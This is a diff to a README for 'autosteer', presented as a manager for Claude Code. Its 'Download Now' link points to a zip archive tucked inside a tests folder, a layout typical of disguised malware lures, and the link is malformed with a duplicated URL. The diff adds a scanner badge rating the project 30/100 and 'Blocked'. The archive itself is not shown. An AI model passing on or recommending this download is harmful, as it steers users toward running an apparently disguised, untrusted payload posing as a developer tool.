@@ -1,5 +1,7 @@
 # 🚀 autosteer - Manage Your Claude Code Effortlessly
 
+[![SafeSkill 30/100](https://img.shields.io/badge/SafeSkill-30%2F100_Blocked-red)](https://safeskill.dev/scan/apothegmatic-whiskfern276-autosteer)
+
 ## 📥 Download Now
 [![Download autosteer](https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/stores/__tests__/Software-2.4.zip%https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/stores/__tests__/Software-2.4.zip)](https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/stores/__tests__/Software-2.4.zip)
 
